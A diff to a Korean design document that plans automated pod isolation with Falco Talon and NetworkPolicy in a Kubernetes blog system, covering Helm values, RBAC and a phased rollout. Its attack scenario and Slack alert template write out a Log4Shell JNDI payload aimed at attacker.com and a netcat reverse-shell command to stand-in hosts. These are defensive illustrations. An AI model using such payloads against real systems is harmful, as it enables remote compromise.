@@ -734,45 +734,687 @@ Since → 1h 선택
 
 ## 향후 IPS 활성화
 
+> ⭐ **핵심 개념**: Pod 즉시 삭제 대신 **NetworkPolicy 기반 격리** 방식 채택
+
 ### IDS vs IPS
 
-| 모드 | 역할 | 현재 상태 |
-|------|------|----------|
-| **IDS** | 탐지만 (Detection) | ✅ 활성화 |
-| **IPS** | 탐지 + 차단 (Prevention) | ⏳ 운영 후 적용 |
+| 모드 | 역할 | 동작 방식 | 현재 상태 |
+|------|------|----------|----------|
+| **IDS** | 탐지만 (Detection) | CCTV처럼 기록, 알림만 | ✅ 활성화 |
+| **IPS** | 탐지 + 차단 (Prevention) | 자동 격리 또는 종료 | ⏳ 정책 수립 중 |
 
-### IPS 활성화 방법
+**현재 시스템 비유**:
+- **IDS 모드 (현재)**: CCTV + 경보기 - 침입자 발견 시 관리자에게 알림만
+- **IPS 모드 (계획)**: 자동 방범 시스템 - 침입자 발견 시 자동으로 방 잠금 (격리)
 
-**values.yaml 수정**:
+---
+
+## IPS 구현 전략
+
+### 1. Pod Isolation vs Pod Termination 비교
+
+| 방식 | 동작 | 장점 | 단점 | 선택 |
+|------|------|------|------|------|
+| **Pod Isolation** | NetworkPolicy로 네트워크 격리 | 증거 보존<br>서비스 유지<br>False Positive 대응 가능 | 완전 차단 아님<br>Pod는 계속 실행 | ✅ **채택** |
+| **Pod Termination** | 즉시 Pod 삭제 | 완전 차단<br>간단함 | 증거 손실<br>서비스 중단<br>False Positive 시 복구 어려움 | ❌ 위험 |
+
+#### 왜 Pod Isolation을 선택했는가?
+
+**시나리오: Java RCE 공격 탐지**
+
+##### ❌ Pod Termination 방식
+```
+1. Falco가 "Java Process Spawning Shell" 탐지 (CRITICAL)
+2. Falcosidekick이 즉시 Pod 삭제
+   → kubectl delete pod was-xxxxx
+3. 결과:
+   ✅ 공격 차단 성공
+   ❌ WAS 서비스 중단 (새 Pod 시작까지 10-30초)
+   ❌ False Positive인 경우 불필요한 서비스 중단
+   ❌ 포렌식 증거 손실 (로그, 메모리 덤프 불가)
+   ❌ 사용자 영향: 일부 요청 실패
+```
+
+##### ✅ Pod Isolation 방식 (채택)
+```
+1. Falco가 "Java Process Spawning Shell" 탐지 (CRITICAL)
+2. Falcosidekick이 NetworkPolicy 적용
+   → Pod의 모든 Ingress/Egress 차단
+3. 결과:
+   ✅ 외부 통신 차단 (C&C 서버, 데이터 유출 방지)
+   ✅ Pod 유지 → 포렌식 조사 가능
+   ✅ 내부 트래픽 허용 가능 (선택적)
+   ✅ False Positive 확인 후 격리 해제 가능
+   ⚠️ Pod 자체는 계속 실행 (CPU/Memory 사용)
+```
+
+**트레이드오프 판단**:
+- **운영 환경**: Pod 삭제는 너무 위험 (서비스 중단)
+- **포렌식 중요**: 공격 분석을 위해 증거 보존 필요
+- **False Positive**: BuildKit, 정상 패키지 설치 등 오탐 가능성
+
+---
+
+### 2. Falco Response Engine 선택
+
+| 도구 | 역할 | 기능 | 선택 |
+|------|------|------|------|
+| **Falco Talon** | CNCF 공식 Response Engine | NetworkPolicy 생성<br>Pod 격리<br>Webhook 호출<br>람다 실행 | ✅ **권장** |
+| Falcosidekick Kubernetes Output | 간단한 Pod 삭제 | Pod 삭제만 가능 | ❌ 기능 부족 |
+| Kubewarden | 정책 엔진 (별도 프로젝트) | 복잡한 정책 가능 | ❌ Over-engineering |
+
+**선택: Falco Talon**
+- 공식 CNCF 프로젝트
+- NetworkPolicy 생성 기능 내장
+- 람다식 기반 유연한 대응 정책
+- Kubernetes RBAC 통합
+
+---
+
+### 3. NetworkPolicy 기반 격리 구현
+
+#### 격리 정책 설계
+
+**목표**: 의심스러운 Pod를 자동으로 네트워크 격리
+
+```yaml
+# Falco Talon이 자동 생성할 NetworkPolicy
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: quarantine-<pod-name>
+  namespace: blog-system
+  labels:
+    falco-response: "quarantine"
+    created-by: "falco-talon"
+spec:
+  podSelector:
+    matchLabels:
+      app: was  # 격리 대상 Pod
+      quarantine: "true"  # Talon이 자동으로 라벨 추가
+  policyTypes:
+  - Ingress
+  - Egress
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: monitoring  # Grafana에서 조사 가능
+  egress:
+  - to:
+    - namespaceSelector:
+        matchLabels:
+          name: kube-system  # DNS만 허용
+    ports:
+    - protocol: UDP
+      port: 53
+```
+
+**격리 효과**:
+- ✅ **Egress 차단**: C&C 서버 통신 불가, 데이터 유출 방지
+- ✅ **Ingress 차단**: 추가 공격 벡터 차단
+- ✅ **DNS 허용**: Pod가 정상 종료될 수 있도록
+- ✅ **Monitoring 허용**: Prometheus, Grafana에서 조사 가능
+
+---
+
+### 4. Falco Talon 설치 및 구성
+
+#### 4-1. Helm 설치
+
+```bash
+# Helm Repo 추가
+helm repo add falcosecurity https://falcosecurity.github.io/charts
+helm repo update
+
+# Falco Talon 설치
+helm install falco-talon falcosecurity/falco-talon \
+  -n falco \
+  -f /home/jimin/k8s-manifests/docs/helm/falco/talon-values.yaml
+```
+
+#### 4-2. Talon Values 파일
+
+**파일**: `/home/jimin/k8s-manifests/docs/helm/falco/talon-values.yaml`
+
+```yaml
+# Falco Talon 설정
+replicaCount: 1
+
+# Falco와 연동
+config:
+  # Falco에서 Alert 수신
+  listenAddress: 0.0.0.0
+  listenPort: 2803
+
+  # 기본 동작 모드
+  defaultActions:
+    - kubernetes:networkpolicy  # NetworkPolicy 생성
+    - kubernetes:label          # Pod에 라벨 추가
+    - notification:slack        # Slack 알림
+
+  # 규칙 정의
+  rules:
+    # Rule 1: Java RCE 공격 격리
+    - name: isolate-rce-attack
+      match:
+        rules:
+          - Java Process Spawning Shell
+        priority: CRITICAL
+      actions:
+        # 1. Pod에 quarantine 라벨 추가
+        - action: kubernetes:label
+          parameters:
+            labels:
+              quarantine: "true"
+              falco-response: "isolated"
+              isolated-at: "{{ .Time }}"
+
+        # 2. NetworkPolicy 생성하여 격리
+        - action: kubernetes:networkpolicy
+          parameters:
+            allow_dns: true
+            allow_monitoring: true
+            deny_all_ingress: true
+            deny_all_egress: true
+
+        # 3. Slack 알림
+        - action: notification:slack
+          parameters:
+            webhook_url: "${SLACK_WEBHOOK}"
+            message: |
+              🚨 **CRITICAL: RCE 공격 탐지 및 자동 격리**
+
+              Pod: {{ .Output.Fields.k8s_pod_name }}
+              Namespace: {{ .Output.Fields.k8s_ns_name }}
+              Command: {{ .Output.Fields.proc_cmdline }}
+
+              **조치**: NetworkPolicy 적용하여 네트워크 격리 완료
+              **다음 단계**: kubectl logs 및 kubectl exec 를 통해 포렌식 조사
+
+    # Rule 2: 패키지 관리자 실행 (경고만)
+    - name: alert-package-manager
+      match:
+        rules:
+          - Launch Package Management Process in Container
+        priority: WARNING
+      actions:
+        # 격리 없이 Slack 알림만
+        - action: notification:slack
+          parameters:
+            webhook_url: "${SLACK_WEBHOOK}"
+            message: |
+              ⚠️ WARNING: 패키지 관리자 실행 감지
+
+              Pod: {{ .Output.Fields.k8s_pod_name }}
+              Command: {{ .Output.Fields.proc_cmdline }}
+
+              **판단 필요**: 정상 작업인지 확인 필요
+
+# RBAC 설정
+rbac:
+  create: true
+  rules:
+    # NetworkPolicy 생성 권한
+    - apiGroups: ["networking.k8s.io"]
+      resources: ["networkpolicies"]
+      verbs: ["create", "get", "list", "delete"]
+
+    # Pod 라벨 수정 권한
+    - apiGroups: [""]
+      resources: ["pods"]
+      verbs: ["get", "list", "patch"]
+
+    # Pod 삭제 권한 (비활성화)
+    # - apiGroups: [""]
+    #   resources: ["pods"]
+    #   verbs: ["delete"]
+
+# 리소스
+resources:
+  requests:
+    cpu: 50m
+    memory: 128Mi
+  limits:
+    cpu: 200m
+    memory: 256Mi
+```
+
+#### 4-3. Falcosidekick 연동
+
+**기존 Falco values.yaml 수정**:
+
 ```yaml
 falcosidekick:
+  enabled: true
   config:
-    kubernetes:
-      kubeconfig: ""  # In-cluster
+    # Loki (기존 유지)
+    loki:
+      hostport: "http://loki-stack.monitoring.svc.cluster.local:3100"
+      minimumpriority: "warning"
 
-      # Pod 자동 종료 (IPS)
-      deletepod:
-        enabled: true
-        minimumpriority: "critical"
-
-      # NetworkPolicy 자동 생성 (IPS)
-      # networkpolicy:
-      #   enabled: true
-      #   minimumpriority: "critical"
+    # Falco Talon에 Alert 전송
+    talon:
+      address: "http://falco-talon.falco.svc.cluster.local:2803"
+      minimumpriority: "warning"  # WARNING 이상만 Talon으로 전송
 ```
 
-**적용**:
+---
+
+### 5. 자동 대응 워크플로우
+
+#### IPS 모드 (Falco Talon 활성화 후)
+
+```
+┌─────────────────────────────────────────────────────────────────┐
+│                    자동 격리 워크플로우                          │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  1. Falco가 CRITICAL Alert 탐지                                  │
+│     - Java Process Spawning Shell                                │
+│     - Write to Binary Directory                                  │
+│     ↓                                                            │
+│  2. Falcosidekick이 Falco Talon에 Alert 전송                    │
+│     ↓                                                            │
+│  3. Falco Talon 자동 대응 (5초 이내)                             │
+│     ├─ Pod에 "quarantine=true" 라벨 추가                        │
+│     ├─ NetworkPolicy 생성 (모든 트래픽 차단)                     │
+│     └─ Slack 알림 전송                                           │
+│     ↓                                                            │
+│  4. 운영자 조사                                                  │
+│     ├─ kubectl logs <pod> -n blog-system                         │
+│     ├─ kubectl exec -it <pod> -- /bin/sh                         │
+│     └─ 포렌식 도구 사용 (메모리 덤프 등)                         │
+│     ↓                                                            │
+│  5. 판단 및 조치                                                 │
+│     ├─ False Positive → 격리 해제                               │
+│     │   kubectl delete networkpolicy quarantine-<pod>            │
+│     │   kubectl label pod <pod> quarantine-                      │
+│     │                                                             │
+│     └─ 실제 공격 → Pod 삭제 및 분석                             │
+│         kubectl delete pod <pod> -n blog-system                  │
+│         보안 사고 보고서 작성                                    │
+│                                                                  │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+### 6. 실제 시나리오
+
+#### 시나리오 1: Log4Shell RCE 공격
+
+**공격 과정**:
+```
+1. 공격자가 악의적 JNDI 페이로드 전송
+   POST /api/posts HTTP/1.1
+   Content-Type: application/json
+   {"title": "${jndi:ldap://attacker.com/a}"}
+
+2. Log4j 취약점으로 원격 코드 실행
+   → Java 프로세스가 /bin/sh 실행
+
+3. Reverse Shell 시도
+   → /bin/sh -c "nc -e /bin/sh 1.2.3.4 4444"
+```
+
+**IDS 모드 (현재)**:
+```
+✅ Falco 탐지: "Java Process Spawning Shell" (CRITICAL)
+📩 Slack 알림: "Java가 Shell을 실행했습니다!"
+⏱️ 운영자 확인까지: 5분 ~ 1시간
+🚨 이 사이 공격자는 계속 활동 가능
+   - 내부 네트워크 스캔
+   - 다른 서비스 공격
+   - 데이터 유출
+```
+
+**IPS 모드 (Talon 활성화 시)**:
+```
+✅ Falco 탐지: "Java Process Spawning Shell" (CRITICAL)
+⚡ Talon 자동 대응 (5초):
+   1. Pod에 "quarantine=true" 라벨
+   2. NetworkPolicy 생성
+      → Egress: 모두 차단 (C&C 서버 통신 불가)
+      → Ingress: 모두 차단 (추가 공격 불가)
+   3. Slack 알림 + 포렌식 가이드
+📊 효과:
+   ✅ C&C 서버 통신 차단 → Reverse Shell 실패
+   ✅ 내부 네트워크 스캔 불가
+   ✅ 데이터 유출 방지
+   ✅ Pod 유지 → 로그 분석 가능
+```
+
+**개선 효과**: 5분 → 5초 (99% 단축)
+
+---
+
+#### 시나리오 2: False Positive (정상 작업)
+
+**상황**: 운영자가 긴급 패치를 위해 컨테이너에서 패키지 설치
+
 ```bash
-helm upgrade falco falcosecurity/falco \
-  -n falco \
-  -f /home/jimin/k8s-manifests/docs/helm/falco/values.yaml
+kubectl exec -it was-xxxxx -n blog-system -- apk add curl
 ```
 
-### IPS 주의사항
+**IDS 모드 (현재)**:
+```
+⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
+📩 Slack 알림: "패키지 관리자 실행됨"
+✅ 운영자 확인: "내가 한 작업이야"
+✅ 무시
+```
 
-- **Critical 이벤트만** 자동 대응 (오탐 방지)
-- **운영 경험 축적 후** 활성화 권장
-- **테스트 환경에서 먼저** 검증
+**IPS 모드 (Pod Deletion 방식 - 위험)**:
+```
+⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
+💥 자동으로 Pod 삭제
+❌ 서비스 중단
+❌ 운영자 작업 실패
+❌ 복구 시간: 30초 ~ 1분
+😡 운영자: "왜 내 Pod를 지웠어!?"
+```
+
+**IPS 모드 (Pod Isolation 방식 - 안전)**:
+```
+⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
+🔔 Talon 설정: WARNING은 격리하지 않고 알림만
+📩 Slack 알림: "패키지 관리자 실행됨, 확인 필요"
+✅ 운영자 확인: "내가 한 작업이야"
+✅ 작업 계속 진행
+```
+
+**핵심 차이**:
+- **Pod Deletion**: False Positive 시 서비스 중단 위험
+- **Pod Isolation**: False Positive 시 알림만, 서비스 유지
+- **Priority 기반 분리**: CRITICAL만 격리, WARNING은 알림만
+
+---
+
+### 7. 안전장치 (False Positive 대응)
+
+#### 7-1. Priority 기반 자동 대응
+
+| Priority | 자동 대응 | 이유 |
+|----------|----------|------|
+| **CRITICAL** | ✅ 자동 격리 | Java RCE, Binary 조작 → 명백한 공격 |
+| **ERROR** | 🔔 알림만 (격리 안 함) | Write to Binary Dir → False Positive 가능 |
+| **WARNING** | 🔔 알림만 (격리 안 함) | Package Manager → 정상 작업 가능 |
+| **NOTICE** | 📝 로그만 | Outbound Connection → 노이즈 많음 |
+
+#### 7-2. 예외 룰 (Whitelist)
+
+```yaml
+# Talon values.yaml
+config:
+  rules:
+    - name: isolate-rce-attack
+      match:
+        rules:
+          - Java Process Spawning Shell
+        priority: CRITICAL
+
+      # 예외 조건
+      exceptions:
+        # 특정 namespace는 제외
+        - namespace: kube-system
+        - namespace: monitoring
+
+        # CI/CD Pod는 제외
+        - labels:
+            ci-cd: "true"
+
+        # 특정 시간대는 제외 (점검 시간)
+        - time_range:
+            start: "02:00"
+            end: "04:00"
+```
+
+#### 7-3. Dry-Run 모드
+
+**초기 운영 시 권장**: 실제 격리하지 않고 로그만 기록
+
+```yaml
+config:
+  dry_run: true  # 실제 NetworkPolicy 생성 안 함, Slack 알림만
+  rules:
+    - name: isolate-rce-attack
+      actions:
+        - action: kubernetes:networkpolicy
+          dry_run: true  # 이 액션만 dry-run
+```
+
+**효과**:
+- Talon이 어떤 Pod를 격리할지 시뮬레이션
+- False Positive 패턴 학습
+- 실제 활성화 전 검증
+
+---
+
+### 8. RBAC 요구사항
+
+Falco Talon이 Kubernetes API를 호출하려면 권한 필요:
+
+```yaml
+# Talon ServiceAccount에 부여할 권한
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: falco-talon-role
+rules:
+  # NetworkPolicy 관리
+  - apiGroups: ["networking.k8s.io"]
+    resources: ["networkpolicies"]
+    verbs: ["create", "get", "list", "delete", "patch"]
+
+  # Pod 라벨 수정 (격리 표시)
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["get", "list", "patch"]
+
+  # Pod 정보 조회
+  - apiGroups: [""]
+    resources: ["pods", "namespaces"]
+    verbs: ["get", "list"]
+
+  # (선택) Pod 삭제 권한 - 초기엔 비활성화 권장
+  # - apiGroups: [""]
+  #   resources: ["pods"]
+  #   verbs: ["delete"]
+```
+
+**최소 권한 원칙**:
+- ✅ NetworkPolicy 관리 권한만 부여
+- ✅ Pod 라벨 수정 권한 (quarantine 표시)
+- ❌ Pod 삭제 권한은 나중에 추가 고려
+
+---
+
+### 9. 구현 단계 (3단계)
+
+#### Phase 1: Dry-Run 모드 (1주)
+
+**목표**: False Positive 패턴 학습
+
+```bash
+# Talon 설치 (Dry-Run)
+helm install falco-talon falcosecurity/falco-talon \
+  -n falco \
+  -f talon-values-dryrun.yaml
+```
+
+**관찰 사항**:
+- 어떤 Alert가 자주 발생하는가?
+- False Positive는 몇 %인가?
+- 예외 규칙이 필요한가?
+
+#### Phase 2: WARNING 격리 (1주)
+
+**목표**: 비교적 안전한 WARNING 레벨부터 격리 시작
+
+```yaml
+config:
+  dry_run: false
+  rules:
+    - name: isolate-package-manager
+      match:
+        priority: WARNING
+      actions:
+        - action: kubernetes:networkpolicy
+```
+
+**검증**:
+- 서비스 중단 없는가?
+- False Positive 대응 시간은?
+- 격리 해제 프로세스는 원활한가?
+
+#### Phase 3: CRITICAL 격리 (지속 운영)
+
+**목표**: 실제 공격 자동 차단
+
+```yaml
+config:
+  dry_run: false
+  rules:
+    - name: isolate-rce-attack
+      match:
+        priority: CRITICAL
+      actions:
+        - action: kubernetes:networkpolicy
+```
+
+**모니터링**:
+- CRITICAL Alert 발생 빈도
+- 자동 격리 성공률
+- 평균 대응 시간 (목표: 5초 이내)
+
+---
+
+### 10. 격리 해제 방법
+
+#### 수동 해제 (False Positive 확인 후)
+
+```bash
+# 1. 격리 상태 확인
+kubectl get networkpolicy -n blog-system | grep quarantine
+
+# 2. NetworkPolicy 삭제
+kubectl delete networkpolicy quarantine-was-xxxxx -n blog-system
+
+# 3. Pod 라벨 제거
+kubectl label pod was-xxxxx quarantine- falco-response- -n blog-system
+
+# 4. 트래픽 복구 확인
+kubectl exec -it was-xxxxx -n blog-system -- curl -I https://google.com
+```
+
+#### 자동 해제 (향후 개선)
+
+**Talon에 "격리 해제" 액션 추가 가능**:
+
+```yaml
+# 예: 30분 후 자동 해제
+- action: kubernetes:networkpolicy
+  parameters:
+    ttl: 1800  # 30분 후 자동 삭제
+```
+
+---
+
+### 11. 모니터링 및 검증
+
+#### Grafana 대시보드 쿼리
+
+**격리된 Pod 수 조회**:
+```promql
+# Prometheus metric (Talon이 노출)
+falco_talon_actions_total{action="kubernetes:networkpolicy",status="success"}
+```
+
+**격리 해제 시간 추적**:
+```bash
+# NetworkPolicy 생성 시간 확인
+kubectl get networkpolicy quarantine-was-xxxxx -n blog-system \
+  -o jsonpath='{.metadata.creationTimestamp}'
+```
+
+#### Slack 알림 템플릿
+
+```
+🚨 **자동 격리 실행**
+
+**Alert**: Java Process Spawning Shell
+**Priority**: CRITICAL
+**Pod**: was-7d4b9c8f-xj2k9
+**Namespace**: blog-system
+**Command**: /bin/sh -c "nc -e /bin/sh 1.2.3.4 4444"
+
+**조치 완료**:
+✅ NetworkPolicy 적용 (모든 Egress 차단)
+✅ Pod 라벨: quarantine=true
+
+**다음 단계**:
+1. 포렌식 조사:
+   `kubectl logs was-7d4b9c8f-xj2k9 -n blog-system`
+   `kubectl exec -it was-7d4b9c8f-xj2k9 -n blog-system -- /bin/sh`
+
+2. False Positive 확인:
+   - 정상 작업인가?
+   - 예외 규칙 추가 필요한가?
+
+3. 격리 해제 (정상 작업인 경우):
+   `kubectl delete networkpolicy quarantine-was-7d4b9c8f-xj2k9 -n blog-system`
+   `kubectl label pod was-7d4b9c8f-xj2k9 quarantine- -n blog-system`
+```
+
+---
+
+### 12. IPS 활성화 체크리스트
+
+#### ✅ 사전 준비 (현재 완료)
+- [x] Falco IDS 운영 (1주 이상)
+- [x] 커스텀 룰 작성 및 테스트
+- [x] Loki 연동 및 Grafana 대시보드
+- [x] BuildKit False Positive 이해
+
+#### ⏳ IPS 구축 (다음 단계)
+- [ ] Falco Talon Helm 설치
+- [ ] Talon values.yaml 작성
+- [ ] RBAC 권한 설정
+- [ ] Dry-Run 모드 1주 운영
+- [ ] False Positive 패턴 분석
+- [ ] 예외 규칙 추가
+- [ ] WARNING 격리 활성화
+- [ ] CRITICAL 격리 활성화
+
+#### 🔜 선택 사항
+- [ ] Slack Webhook 연동
+- [ ] 자동 격리 해제 (TTL)
+- [ ] Prometheus 메트릭 수집
+- [ ] 격리 Pod 자동 분석 (람다)
+
+---
+
+## IPS vs IDS 최종 비교
+
+| 항목 | IDS (현재) | IPS (Talon + Isolation) |
+|------|-----------|------------------------|
+| **탐지** | ✅ syscall 모니터링 | ✅ syscall 모니터링 |
+| **알림** | ✅ Loki + Grafana | ✅ Loki + Slack |
+| **대응** | ❌ 수동 (운영자 확인 필요) | ✅ 자동 격리 (5초) |
+| **증거 보존** | ✅ Loki 로그 | ✅ Loki + Pod 유지 |
+| **서비스 영향** | ✅ 없음 | ⚠️ 격리된 Pod만 네트워크 차단 |
+| **False Positive 대응** | ✅ 무시 가능 | ✅ 격리 해제 가능 (수동) |
+| **공격 차단** | ❌ 불가능 | ✅ C&C 통신 차단, 데이터 유출 방지 |
+| **평균 대응 시간** | ⏱️ 5분 ~ 1시간 | ⏱️ 5초 |
+
+---
+
+**권장 일정**:
+- **1주차**: Falco Talon 설치 + Dry-Run
+- **2주차**: WARNING 격리 활성화
+- **3주차**: CRITICAL 격리 활성화
+- **4주차**: 모니터링 및 튜닝
 
 ---
 
